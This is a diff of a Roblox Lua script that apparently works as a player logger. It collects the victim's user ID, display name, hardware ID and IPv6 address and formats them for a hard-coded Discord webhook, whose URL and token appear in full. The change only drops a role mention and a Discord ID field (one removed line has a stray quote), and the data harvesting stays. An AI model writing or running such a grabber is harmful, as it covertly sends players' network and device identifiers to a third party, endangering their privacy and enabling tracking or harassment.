@@ -17,7 +17,6 @@ local gamelink = 'https://roblox.com/games/' .. game.PlaceId .. '/' .. game:GetS
 local clientID = LocalPlayer.UserId
 local displayname = LocalPlayer.DisplayName
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local role_mention = "<@&1101402054989193308>"
 local ownerName = game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId)
 local ownerUserId = game.CreatorId
 _G.Webhookid = "https://discord.com/api/webhooks/1129375899133935677/sw1Xdqqj8JbxDm8VesSua9-26m0avH88KJBBVIQHgZfQdPsNZbE_LOamwNR0NhlPoEJ3"
@@ -92,11 +91,6 @@ pcall(function()
                     {
                         ["name"] = "IPv6",
                         ["value"] = ipv6,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Discord ID",
-                        ["value"] = discordID",
                         ["inline"] = true
                     },
                     {
